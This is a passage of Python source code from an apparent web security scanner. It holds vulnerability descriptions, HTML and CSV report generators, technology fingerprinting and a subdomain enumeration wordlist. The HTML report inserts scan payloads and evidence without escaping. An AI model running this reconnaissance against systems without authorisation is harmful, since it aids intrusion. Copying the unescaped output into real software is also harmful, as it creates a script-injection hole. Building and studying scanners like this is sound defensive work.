            "XSS": {
                "risk_score": 7.5,
                "severity": "high",
                "description": "Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious client-side scripts into web pages viewed by other users. These scripts can steal sensitive information, manipulate page content, or perform actions on behalf of the victim.",
                "impact": "Successful XSS attacks can lead to session hijacking, credential theft, data exfiltration, defacement, and malware distribution. In some cases, it may lead to complete account takeover.",
                "remediation": "Implement proper input validation and output encoding. Use Content Security Policy (CSP) headers, escape user input, and utilize framework-provided XSS protection features. Consider implementing a strict allowlist approach for user input.",
                "cwe_id": "CWE-79",
                "references": [
                    "https://owasp.org/www-community/attacks/xss/",
                    "https://portswigger.net/web-security/cross-site-scripting",
                    "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
                ]
            },
            "SQL Injection": {
                "risk_score": 8.5,
                "severity": "high",
                "description": "SQL Injection vulnerabilities allow attackers to interfere with database queries by inserting malicious SQL code into input fields. This can lead to unauthorized access to sensitive data stored in databases.",
                "impact": "Attackers can bypass authentication, access, modify, or delete data, extract sensitive information, and potentially gain administrative access to the database or underlying system.",
                "remediation": "Use parameterized queries or prepared statements, implement input validation, employ stored procedures, and use an ORM (Object-Relational Mapping) layer. Minimize database account privileges and sanitize input properly.",
                "cwe_id": "CWE-89",
                "references": [
                    "https://owasp.org/www-community/attacks/SQL_Injection",
                    "https://portswigger.net/web-security/sql-injection",
                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                ]
            },
            "Open Redirect": {
                "risk_score": 5.5,
                "severity": "medium",
                "description": "Open Redirect vulnerabilities occur when a web application accepts untrusted input that could cause it to redirect users to malicious websites. These vulnerabilities can be exploited to conduct phishing attacks.",
                "impact": "Attackers can redirect users to malicious websites, potentially leading to phishing attacks, credential theft, or malware distribution. The redirection appears to come from a trusted source, increasing the likelihood of user deception.",
                "remediation": "Implement a whitelist of allowed redirect destinations, avoid using user-controllable data for redirects, or use relative path redirects only. If redirects to external sites are necessary, implement an indirect reference map.",
                "cwe_id": "CWE-601",
                "references": [
                    "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
                    "https://cwe.mitre.org/data/definitions/601.html",
                    "https://portswigger.net/kb/issues/00500100_open-redirection-reflected"
                ]
            },
            "CSRF": {
                "risk_score": 6.0,
                "severity": "medium",
                "description": "Cross-Site Request Forgery (CSRF) vulnerabilities allow attackers to trick users into performing unintended actions on websites where they're authenticated. The attacker crafts a malicious request that uses the victim's authentication credentials.",
                "impact": "Attackers can perform actions on behalf of authenticated users without their consent, including changing account details, making purchases, or deleting data. The impact depends on the sensitivity of the actions available to authenticated users.",
                "remediation": "Implement anti-CSRF tokens for all state-changing operations, use the SameSite cookie attribute, verify the HTTP Referer header, and require re-authentication for sensitive operations.",
                "cwe_id": "CWE-352",
                "references": [
                    "https://owasp.org/www-community/attacks/csrf",
                    "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
                    "https://portswigger.net/web-security/csrf"
                ]
            },
            "Command Injection": {
                "risk_score": 9.0,
                "severity": "critical",
                "description": "Command Injection vulnerabilities allow attackers to execute arbitrary operating system commands on the host. This occurs when applications pass unsafe user-supplied data to a system shell for execution.",
                "impact": "Attackers can execute arbitrary commands with the privileges of the vulnerable application, potentially leading to data theft, service disruption, server compromise, or complete system takeover.",
                "remediation": "Avoid calling OS commands directly when possible. If necessary, use language-specific functions that don't invoke a shell, implement strict input validation, use allowlists for permitted values, and run the application with minimal privileges.",
                "cwe_id": "CWE-77",
                "references": [
                    "https://owasp.org/www-community/attacks/Command_Injection",
                    "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
                    "https://portswigger.net/web-security/os-command-injection"
                ]
            },
            "LFI": {
                "risk_score": 7.0,
                "severity": "high",
                "description": "Local File Inclusion (LFI) vulnerabilities allow attackers to include local files on the server through the web application. This can expose sensitive information or lead to code execution if combined with other vulnerabilities.",
                "impact": "Attackers can access sensitive files such as configuration files, password files, or application source code. In some cases, LFI can lead to remote code execution, especially when combined with file upload vulnerabilities.",
                "remediation": "Avoid passing user-supplied input to file inclusion functions. If necessary, implement strict input validation, use allowlists for permitted files, and disable PHP wrappers if applicable. Consider using indirect references instead of direct file paths.",
                "cwe_id": "CWE-98",
                "references": [
                    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                    "https://cwe.mitre.org/data/definitions/98.html",
                    "https://portswigger.net/web-security/file-path-traversal"
                ]
            },
            "RCE": {
                "risk_score": 9.5,
                "severity": "critical",
                "description": "Remote Code Execution (RCE) vulnerabilities allow attackers to execute arbitrary code on the vulnerable system remotely. This is one of the most severe vulnerabilities as it can lead to complete system compromise.",
                "impact": "Attackers can execute arbitrary code with the privileges of the vulnerable application, potentially leading to data exfiltration, credential theft, lateral movement within the network, and complete system takeover.",
                "remediation": "Keep software and dependencies updated, implement proper input validation, follow the principle of least privilege, disable dangerous functions, use allowlists for permitted operations, and implement network segmentation.",
                "cwe_id": "CWE-94",
                "references": [
                    "https://owasp.org/www-community/vulnerabilities/Unsafe_Code_Execution",
                    "https://cwe.mitre.org/data/definitions/94.html",
                    "https://portswigger.net/web-security/os-command-injection"
                ]
            },
            "CORS": {
                "risk_score": 5.0,
                "severity": "medium",
                "description": "Cross-Origin Resource Sharing (CORS) misconfigurations can allow unauthorized websites to access resources from your domain. This bypasses the Same-Origin Policy, a key browser security mechanism.",
                "impact": "Attackers can access sensitive data from the victim's authenticated session, leading to information disclosure. In some cases, this can facilitate more advanced attacks like cross-site request forgery.",
                "remediation": "Implement proper CORS headers, avoid using wildcard origins (Access-Control-Allow-Origin: *) for sensitive resources, validate the Origin header against a whitelist, and only allow necessary HTTP methods and headers.",
                "cwe_id": "CWE-942",
                "references": [
                    "https://portswigger.net/web-security/cors",
                    "https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html",
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS"
                ]
            },
            "SSL/TLS": {
                "risk_score": 6.5,
                "severity": "medium",
                "description": "SSL/TLS vulnerabilities involve insecure configurations or outdated protocols that can weaken encrypted communications. These issues can compromise the confidentiality and integrity of data in transit.",
                "impact": "Attackers can potentially eavesdrop on communications, steal sensitive information, or perform man-in-the-middle attacks. This can lead to credential theft, session hijacking, or data exposure.",
                "remediation": "Use modern TLS versions (TLS 1.2+) and disable outdated protocols (SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1), implement strong cipher suites, enable HSTS, configure proper certificate validation, and use secure key exchange mechanisms.",
                "cwe_id": "CWE-326",
                "references": [
                    "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html",
                    "https://cwe.mitre.org/data/definitions/326.html",
                    "https://www.ssllabs.com/ssltest/"
                ]
            },
            "Missing HTTP Security Headers": {
                "risk_score": 4.0,
                "severity": "low",
                "description": "Missing HTTP security headers can make web applications more vulnerable to various attacks. Proper security headers provide an additional layer of protection against common web vulnerabilities.",
                "impact": "The absence of security headers can increase the risk of various attacks, including cross-site scripting (XSS), clickjacking, and data theft. The specific impact depends on which headers are missing.",
                "remediation": "Implement appropriate security headers such as Content-Security-Policy, X-XSS-Protection, X-Frame-Options, Strict-Transport-Security, X-Content-Type-Options, and Referrer-Policy. Regularly test and update header configurations.",
                "cwe_id": "CWE-693",
                "references": [
                    "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html",
                    "https://securityheaders.com/",
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#security"
                ]
            }
        }
    
    def _generate_html_report(self, report_path, report_data, vuln_descriptions):
        """
        Generate a detailed HTML report with visualizations.
        
        Args:
            report_path (str): Path to save the HTML report
            report_data (dict): Data to include in the report
            vuln_descriptions (dict): Descriptions of vulnerabilities
            
        Returns:
            None
        """
        # Get scan information
        scan_info = report_data.get("scan_info", {})
        server_info = report_data.get("server_info", {})
        vulnerabilities = report_data.get("vulnerabilities", [])
        summary = report_data.get("summary", {})
        
        # Generate HTML content
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NetHawk Security Scan Report - {scan_info.get('target', '')}</title>
    <style>
        :root {{
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --accent-color: #e74c3c;
            --light-color: #ecf0f1;
            --dark-color: #34495e;
            --success-color: #2ecc71;
            --warning-color: #f39c12;
            --danger-color: #e74c3c;
            --info-color: #3498db;
            --critical-color: #c0392b;
            --high-color: #e74c3c;
            --medium-color: #f39c12;
            --low-color: #3498db;
            --info-sec-color: #7f8c8d;
        }}
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }}
        
        body {{
            background-color: #f5f5f5;
            color: var(--dark-color);
            line-height: 1.6;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        header {{
            background-color: var(--primary-color);
            color: white;
            padding: 20px;
            border-radius: 5px 5px 0 0;
            margin-bottom: 20px;
        }}
        
        header h1 {{
            font-size: 24px;
            margin-bottom: 10px;
        }}
        
        header p {{
            font-size: 16px;
            opacity: 0.8;
        }}
        
        .card {{
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            overflow: hidden;
        }}
        
        .card-header {{
            padding: 15px 20px;
            background-color: var(--secondary-color);
            color: white;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
        }}
        
        .card-header h2 {{
            font-size: 18px;
            margin: 0;
        }}
        
        .card-body {{
            padding: 20px;
        }}
        
        .table {{
            width: 100%;
            border-collapse: collapse;
        }}
        
        .table th, .table td {{
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        
        .table th {{
            background-color: var(--light-color);
            font-weight: bold;
        }}
        
        .severity {{
            padding: 5px 10px;
            border-radius: 3px;
            font-weight: bold;
            color: white;
            display: inline-block;
        }}
        
        .severity.critical {{
            background-color: var(--critical-color);
        }}
        
        .severity.high {{
            background-color: var(--high-color);
        }}
        
        .severity.medium {{
            background-color: var(--medium-color);
        }}
        
        .severity.low {{
            background-color: var(--low-color);
        }}
        
        .severity.info {{
            background-color: var(--info-sec-color);
        }}
        
        .badge {{
            padding: 5px 10px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 14px;
            color: white;
            display: inline-block;
        }}
        
        .chart-container {{
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }}
        
        .chart {{
            width: 48%;
            background-color: white;
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }}
        
        .vulnerability-details {{
            background-color: #f9f9f9;
            border-left: 4px solid var(--secondary-color);
            padding: 15px;
            margin-top: 10px;
            margin-bottom: 20px;
            border-radius: 0 5px 5px 0;
        }}
        
        .vulnerability-details h4 {{
            margin-bottom: 10px;
            color: var(--secondary-color);
        }}
        
        .collapsible {{
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease-out;
        }}
        
        .pagination {{
            display: flex;
            justify-content: center;
            padding: 20px 0;
        }}
        
        .pagination button {{
            padding: 8px 15px;
            margin: 0 5px;
            border: none;
            background-color: var(--secondary-color);
            color: white;
            border-radius: 3px;
            cursor: pointer;
        }}
        
        .pagination button:disabled {{
            background-color: #cccccc;
            cursor: not-allowed;
        }}
        
        .vulnerability-card {{
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 20px;
            overflow: hidden;
        }}
        
        .vulnerability-card-header {{
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #ddd;
            background-color: #f5f5f5;
        }}
        
        .vulnerability-card-body {{
            padding: 15px;
        }}
        
        footer {{
            text-align: center;
            padding: 20px;
            margin-top: 20px;
            background-color: var(--primary-color);
            color: white;
            border-radius: 0 0 5px 5px;
        }}
        
        .details-grid {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }}
        
        .details-item {{
            margin-bottom: 10px;
        }}
        
        .details-item strong {{
            color: var(--dark-color);
        }}
        
        .reference-list {{
            list-style-type: none;
            padding-left: 0;
        }}
        
        .reference-list li {{
            margin-bottom: 5px;
        }}
        
        .reference-list a {{
            color: var(--secondary-color);
            text-decoration: none;
        }}
        
        .reference-list a:hover {{
            text-decoration: underline;
        }}
        
        .stats-container {{
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }}
        
        .stat-card {{
            flex: 1;
            min-width: 200px;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin: 0 10px 10px 0;
            text-align: center;
        }}
        
        .stat-card h3 {{
            font-size: 16px;
            margin-bottom: 10px;
            color: var(--dark-color);
        }}
        
        .stat-card p {{
            font-size: 24px;
            font-weight: bold;
            color: var(--secondary-color);
        }}
        
        .code-block {{
            background-color: #f4f4f4;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
            font-family: monospace;
            overflow-x: auto;
            white-space: pre-wrap;
        }}
        
        .canvas-container {{
            position: relative;
            width: 100%;
            height: 300px;
        }}
        
        @media (max-width: 768px) {{
            .container {{
                padding: 10px;
            }}
            
            .chart-container {{
                flex-direction: column;
            }}
            
            .chart {{
                width: 100%;
                margin-bottom: 20px;
            }}
            
            .details-grid {{
                grid-template-columns: 1fr;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>NetHawk Security Scan Report</h1>
            <p>Target: {scan_info.get('target', 'Unknown')}</p>
        </header>
        
        <!-- Summary Card -->
        <div class="card">
            <div class="card-header" onclick="toggleCollapsible(this)">
                <h2>Scan Summary</h2>
                <span>▼</span>
            </div>
            <div class="card-body">
                <div class="stats-container">
                    <div class="stat-card">
                        <h3>Total Vulnerabilities</h3>
                        <p>{summary.get('total_vulnerabilities', 0)}</p>
                    </div>
                    <div class="stat-card">
                        <h3>Critical</h3>
                        <p style="color: var(--critical-color);">{summary.get('vulnerability_counts', {}).get('critical', 0)}</p>
                    </div>
                    <div class="stat-card">
                        <h3>High</h3>
                        <p style="color: var(--high-color);">{summary.get('vulnerability_counts', {}).get('high', 0)}</p>
                    </div>
                    <div class="stat-card">
                        <h3>Medium</h3>
                        <p style="color: var(--medium-color);">{summary.get('vulnerability_counts', {}).get('medium', 0)}</p>
                    </div>
                    <div class="stat-card">
                        <h3>Low</h3>
                        <p style="color: var(--low-color);">{summary.get('vulnerability_counts', {}).get('low', 0)}</p>
                    </div>
                </div>
                
                <div class="chart-container">
                    <div class="chart">
                        <h3>Vulnerabilities by Severity</h3>
                        <div class="canvas-container">
                            <canvas id="severityChart"></canvas>
                        </div>
                    </div>
                    <div class="chart">
                        <h3>Vulnerabilities by Type</h3>
                        <div class="canvas-container">
                            <canvas id="typeChart"></canvas>
                        </div>
                    </div>
                </div>
                
                <div class="details-grid" style="margin-top: 20px;">
                    <div class="details-item">
                        <strong>Scan Started:</strong> {scan_info.get('start_time', 'Unknown')}
                    </div>
                    <div class="details-item">
                        <strong>Scan Completed:</strong> {scan_info.get('end_time', 'Unknown')}
                    </div>
                    <div class="details-item">
                        <strong>Duration:</strong> {scan_info.get('duration', 'Unknown')}
                    </div>
                    <div class="details-item">
                        <strong>URLs Discovered:</strong> {summary.get('total_urls_discovered', 0)}
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Server Information Card -->
        <div class="card">
            <div class="card-header" onclick="toggleCollapsible(this)">
                <h2>Server Information</h2>
                <span>▼</span>
            </div>
            <div class="card-body">
                <table class="table">
                    <thead>
                        <tr>
                            <th>Information</th>
                            <th>Value</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Server</td>
                            <td>{server_info.get('server', 'Unknown')}</td>
                        </tr>
                        <tr>
                            <td>Technologies</td>
                            <td>{', '.join(server_info.get('technologies', ['Unknown']))}</td>
                        </tr>
                        <tr>
                            <td>IP Address</td>
                            <td>{server_info.get('ip_address', 'Unknown')}</td>
                        </tr>
                        <tr>
                            <td>HTTP Headers</td>
                            <td>
                                <div class="code-block">
"""

        # Add HTTP headers
        for header, value in server_info.get('headers', {}).items():
            html_content += f"{header}: {value}<br>"
            
        html_content += f"""                                </div>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        
        <!-- Vulnerability Summary Card -->
        <div class="card">
            <div class="card-header" onclick="toggleCollapsible(this)">
                <h2>Vulnerability Summary</h2>
                <span>▼</span>
            </div>
            <div class="card-body">
                <table class="table">
                    <thead>
                        <tr>
                            <th>Vulnerability Type</th>
                            <th>Count</th>
                            <th>Severity</th>
                        </tr>
                    </thead>
                    <tbody>
"""

        # Add vulnerability types
        for vuln_type, count in summary.get('vulnerability_types', {}).items():
            severity = "medium"
            
            # Get severity based on vulnerability type
            for vuln in vulnerabilities:
                if vuln.get('type') == vuln_type:
                    severity = vuln.get('severity', 'medium')
                    break
                    
            html_content += f"""
                        <tr>
                            <td>{vuln_type}</td>
                            <td>{count}</td>
                            <td><span class="severity {severity}">{severity.upper()}</span></td>
                        </tr>
"""
            
        html_content += f"""
                    </tbody>
                </table>
            </div>
        </div>
        
        <!-- Detailed Vulnerabilities Card -->
        <div class="card">
            <div class="card-header" onclick="toggleCollapsible(this)">
                <h2>Detailed Vulnerabilities</h2>
                <span>▼</span>
            </div>
            <div class="card-body">
"""

        # Add vulnerability details
        for i, vuln in enumerate(vulnerabilities):
            vuln_type = vuln.get('type', 'Unknown')
            severity = vuln.get('severity', 'medium')
            risk_score = vuln.get('risk_score', 5.0)
            details = vuln.get('details', {})
            
            html_content += f"""
                <div class="vulnerability-card">
                    <div class="vulnerability-card-header">
                        <h3>{vuln_type}</h3>
                        <span class="severity {severity}">{severity.upper()} - Risk Score: {risk_score}</span>
                    </div>
                    <div class="vulnerability-card-body">
                        <div class="details-grid">
"""

            # Add URL if available
            if 'url' in vuln:
                html_content += f"""
                            <div class="details-item">
                                <strong>URL:</strong> {vuln.get('url', '')}
                            </div>
"""

            # Add parameters if available
            if 'parameters' in vuln:
                html_content += f"""
                            <div class="details-item">
                                <strong>Parameters:</strong> {vuln.get('parameters', '')}
                            </div>
"""

            # Add payload if available
            if 'payload' in vuln:
                html_content += f"""
                            <div class="details-item">
                                <strong>Payload:</strong> <code>{vuln.get('payload', '')}</code>
                            </div>
"""

            # Add evidence if available
            if 'evidence' in vuln:
                html_content += f"""
                            <div class="details-item">
                                <strong>Evidence:</strong> <code>{vuln.get('evidence', '')}</code>
                            </div>
"""

            # Add CWE ID if available
            if details and 'cwe_id' in details:
                html_content += f"""
                            <div class="details-item">
                                <strong>CWE ID:</strong> {details.get('cwe_id', '')}
                            </div>
"""

            html_content += f"""
                        </div>
                        
                        <div class="vulnerability-details">
                            <h4>Description</h4>
                            <p>{details.get('description', 'No description available.')}</p>
                            
                            <h4>Impact</h4>
                            <p>{details.get('impact', 'No impact information available.')}</p>
                            
                            <h4>Remediation</h4>
                            <p>{details.get('remediation', 'No remediation information available.')}</p>
                            
                            <h4>References</h4>
                            <ul class="reference-list">
"""

            # Add references if available
            for ref in details.get('references', []):
                html_content += f"""
                                <li><a href="{ref}" target="_blank">{ref}</a></li>
"""
                
            html_content += f"""
                            </ul>
                        </div>
                    </div>
                </div>
"""
            
        html_content += f"""
            </div>
        </div>
        
        <footer>
            <p>Generated by NetHawk Web Security Scanner on {scan_info.get('end_time', 'Unknown')}</p>
        </footer>
    </div>
    
    <script>
        // Function to toggle collapsible sections
        function toggleCollapsible(element) {{
            const content = element.nextElementSibling;
            const arrow = element.querySelector('span');
            
            if (content.style.maxHeight) {{
                content.style.maxHeight = null;
                arrow.textContent = '▼';
            }} else {{
                content.style.maxHeight = content.scrollHeight + "px";
                arrow.textContent = '▲';
            }}
        }}
        
        // Automatically expand all sections on load
        document.addEventListener('DOMContentLoaded', function() {{
            const headers = document.querySelectorAll('.card-header');
            headers.forEach(header => {{
                const content = header.nextElementSibling;
                const arrow = header.querySelector('span');
                content.style.maxHeight = content.scrollHeight + "px";
                arrow.textContent = '▲';
            }});
            
            // Create charts
            createSeverityChart();
            createTypeChart();
        }});
        
        // Function to create severity chart
        function createSeverityChart() {{
            const ctx = document.getElementById('severityChart').getContext('2d');
            
            // Data from summary
            const critical = {summary.get('vulnerability_counts', {}).get('critical', 0)};
            const high = {summary.get('vulnerability_counts', {}).get('high', 0)};
            const medium = {summary.get('vulnerability_counts', {}).get('medium', 0)};
            const low = {summary.get('vulnerability_counts', {}).get('low', 0)};
            const info = {summary.get('vulnerability_counts', {}).get('info', 0)};
            
            // Create a simple bar chart using canvas
            const data = [critical, high, medium, low, info];
            const labels = ['Critical', 'High', 'Medium', 'Low', 'Info'];
            const colors = ['#c0392b', '#e74c3c', '#f39c12', '#3498db', '#7f8c8d'];
            
            // Calculate max value for scaling
            const maxValue = Math.max(...data) || 1;
            
            // Get canvas dimensions
            const canvas = ctx.canvas;
            const width = canvas.width;
            const height = canvas.height;
            
            // Clear canvas
            ctx.clearRect(0, 0, width, height);
            
            // Draw bars
            const barWidth = (width - 100) / data.length;
            const padding = 40;
            
            // Draw Y-axis
            ctx.beginPath();
            ctx.moveTo(padding, 20);
            ctx.lineTo(padding, height - 40);
            ctx.stroke();
            
            // Draw X-axis
            ctx.beginPath();
            ctx.moveTo(padding, height - 40);
            ctx.lineTo(width - 20, height - 40);
            ctx.stroke();
            
            // Draw bars
            for (let i = 0; i < data.length; i++) {{
                const x = padding + 10 + (i * barWidth);
                const barHeight = ((data[i] / maxValue) * (height - 80));
                const y = height - 40 - barHeight;
                
                // Draw bar
                ctx.fillStyle = colors[i];
                ctx.fillRect(x, y, barWidth - 20, barHeight);
                
                // Draw label
                ctx.fillStyle = '#333';
                ctx.font = '12px Arial';
                ctx.textAlign = 'center';
                ctx.fillText(labels[i], x + ((barWidth - 20) / 2), height - 20);
                
                // Draw value
                ctx.fillStyle = '#333';
                ctx.font = '12px Arial';
                ctx.textAlign = 'center';
                ctx.fillText(data[i], x + ((barWidth - 20) / 2), y - 5);
            }}
        }}
        
        // Function to create type chart
        function createTypeChart() {{
            const ctx = document.getElementById('typeChart').getContext('2d');
            
            // Data from summary
            const typeData = {json.dumps(summary.get('vulnerability_types', {}))};
            
            // Convert to arrays
            const types = Object.keys(typeData);
            const counts = Object.values(typeData);
            
            // Colors
            const colors = [
                '#2ecc71', '#3498db', '#9b59b6', '#e74c3c', '#f39c12', 
                '#1abc9c', '#34495e', '#d35400', '#c0392b', '#7f8c8d'
            ];
            
            // Create a simple pie chart using canvas
            const total = counts.reduce((a, b) => a + b, 0);
            
            // Get canvas dimensions
            const canvas = ctx.canvas;
            const width = canvas.width;
            const height = canvas.height;
            
            // Clear canvas
            ctx.clearRect(0, 0, width, height);
            
            // Center of the pie chart
            const centerX = width / 2;
            const centerY = height / 2;
            const radius = Math.min(centerX, centerY) - 40;
            
            // Draw pie chart
            let startAngle = 0;
            
            if (total > 0) {{
                for (let i = 0; i < counts.length; i++) {{
                    // Calculate the angle
                    const sliceAngle = (counts[i] / total) * 2 * Math.PI;
                    
                    // Draw the slice
                    ctx.beginPath();
                    ctx.fillStyle = i < colors.length ? colors[i] : '#' + Math.floor(Math.random() * 16777215).toString(16);
                    ctx.moveTo(centerX, centerY);
                    ctx.arc(centerX, centerY, radius, startAngle, startAngle + sliceAngle);
                    ctx.closePath();
                    ctx.fill();
                    
                    // Draw the label line
                    const midAngle = startAngle + sliceAngle / 2;
                    const labelX = centerX + Math.cos(midAngle) * (radius + 20);
                    const labelY = centerY + Math.sin(midAngle) * (radius + 20);
                    
                    // Draw text if slice is big enough
                    if (sliceAngle > 0.2) {{
                        ctx.fillStyle = '#333';
                        ctx.font = '12px Arial';
                        ctx.textAlign = 'center';
                        const shortType = types[i].length > 15 ? types[i].substring(0, 15) + '...' : types[i];
                        ctx.fillText(`${{shortType}} (${{counts[i]}})`, labelX, labelY);
                    }}
                    
                    // Update the starting angle
                    startAngle += sliceAngle;
                }}
            }} else {{
                // No data
                ctx.beginPath();
                ctx.fillStyle = '#ddd';
                ctx.arc(centerX, centerY, radius, 0, 2 * Math.PI);
                ctx.fill();
                
                ctx.fillStyle = '#333';
                ctx.font = '14px Arial';
                ctx.textAlign = 'center';
                ctx.fillText('No vulnerability data', centerX, centerY);
            }}
        }}
    </script>
</body>
</html>
"""
        
        # Write HTML content to file
        with open(report_path, 'w') as f:
            f.write(html_content)
            
    def _generate_csv_report(self, report_path, report_data):
        """
        Generate a CSV report for vulnerability findings.
        
        Args:
            report_path (str): Path to save the CSV report
            report_data (dict): Data to include in the report
            
        Returns:
            None
        """
        vulnerabilities = report_data.get("vulnerabilities", [])
        
        # Create CSV file
        with open(report_path, 'w', newline='') as csvfile:
            fieldnames = [
                'Vulnerability Type', 
                'Severity', 
                'Risk Score', 
                'URL', 
                'Parameters', 
                'Payload', 
                'Evidence', 
                'CWE ID',
                'Description',
                'Impact',
                'Remediation'
            ]
            
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            
            for vuln in vulnerabilities:
                vuln_type = vuln.get('type', 'Unknown')
                details = vuln.get('details', {})
                
                writer.writerow({
                    'Vulnerability Type': vuln_type,
                    'Severity': vuln.get('severity', 'unknown'),
                    'Risk Score': vuln.get('risk_score', ''),
                    'URL': vuln.get('url', ''),
                    'Parameters': vuln.get('parameters', ''),
                    'Payload': vuln.get('payload', ''),
                    'Evidence': vuln.get('evidence', ''),
                    'CWE ID': details.get('cwe_id', ''),
                    'Description': details.get('description', ''),
                    'Impact': details.get('impact', ''),
                    'Remediation': details.get('remediation', '')
                })

    def detect_tech_stack(self):
        """Detect technologies used by the target website"""
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            html = response.text
            headers = response.headers

            tech_detected = {}
            
            # Check headers for technology clues
            server = headers.get('Server', '')
            if server:
                tech_detected['Web Server'] = server
                
            powered_by = headers.get('X-Powered-By', '')
            if powered_by:
                tech_detected['Powered By'] = powered_by
                
            # Check for CMS and frameworks
            # WordPress
            if 'wp-content' in html or 'wp-includes' in html:
                tech_detected['CMS'] = 'WordPress'
                
                # Check for WordPress version
                wp_version_match = re.search(r'meta name="generator" content="WordPress ([0-9.]+)"', html)
                if wp_version_match:
                    tech_detected['WordPress Version'] = wp_version_match.group(1)
                    
            # Joomla
            elif 'joomla' in html.lower():
                tech_detected['CMS'] = 'Joomla'
                
            # Drupal
            elif 'drupal' in html.lower():
                tech_detected['CMS'] = 'Drupal'
            
            # JavaScript frameworks
            if 'react' in html.lower() or 'reactjs' in html.lower():
                tech_detected['Frontend Framework'] = 'React'
            elif 'vue' in html.lower() or 'vuejs' in html.lower():
                tech_detected['Frontend Framework'] = 'Vue.js'
            elif 'angular' in html.lower():
                tech_detected['Frontend Framework'] = 'Angular'
                
            # Other technologies
            if 'jquery' in html.lower():
                tech_detected['JavaScript Library'] = 'jQuery'
            if 'bootstrap' in html.lower():
                tech_detected['CSS Framework'] = 'Bootstrap'
            if 'tailwind' in html.lower():
                tech_detected['CSS Framework'] = 'Tailwind CSS'
                
            # Database hints
            if 'mysql' in html.lower():
                tech_detected['Database'] = 'MySQL'
            elif 'postgresql' in html.lower():
                tech_detected['Database'] = 'PostgreSQL'
            elif 'mongodb' in html.lower():
                tech_detected['Database'] = 'MongoDB'
                
            # Check for web application frameworks
            if 'laravel' in html.lower():
                tech_detected['Backend Framework'] = 'Laravel'
            elif 'django' in html.lower():
                tech_detected['Backend Framework'] = 'Django'
            elif 'flask' in html.lower():
                tech_detected['Backend Framework'] = 'Flask'
            elif 'express' in html.lower() or 'node.js' in html.lower():
                tech_detected['Backend Framework'] = 'Express/Node.js'
            elif 'ruby on rails' in html.lower() or 'rubyonrails' in html.lower():
                tech_detected['Backend Framework'] = 'Ruby on Rails'
                
            # Authentication systems
            if 'oauth' in html.lower():
                tech_detected['Authentication'] = 'OAuth'
            elif 'jwt' in html.lower() or 'json web token' in html.lower():
                tech_detected['Authentication'] = 'JWT'
                
            self.technology_stack = tech_detected
            
            # Print detected technologies
            if tech_detected:
                print(Fore.GREEN + "[+] Detected the following technologies:" + Style.RESET_ALL)
                for tech_type, tech_name in tech_detected.items():
                    print(Fore.YELLOW + f"    {tech_type}: {tech_name}" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + "[!] Could not detect technologies with confidence" + Style.RESET_ALL)
                
        except Exception as e:
            print(Fore.RED + f"[!] Error detecting technology stack: {str(e)}" + Style.RESET_ALL)
    
    def enumerate_subdomains(self):
        """Enumerate subdomains of the target domain"""
        parsed_url = urllib.parse.urlparse(self.target_url)
        root_domain = parsed_url.netloc
        
        # Remove www. if present
        if root_domain.startswith('www.'):
            root_domain = root_domain[4:]
            
        # Common subdomains to check
        common_subdomains = [
            'www', 'mail', 'remote', 'blog', 'webmail', 'server', 'ns1', 'ns2', 
            'smtp', 'secure', 'vpn', 'admin', 'mx', 'pop', 'api', 'dev', 'test',
            'portal', 'host', 'dns', 'support', 'web', 'cloud', 'exchange',
            'app', 'office', 'mysql', 'ftp', 'git', 'wiki', 'proxy', 'backup',
            'forum', 'shop', 'store', 'beta', 'staging', 'admin', 'account',
            'accounts', 'help', 'm', 'mobile', 'cdn', 'media', 'images', 'files',
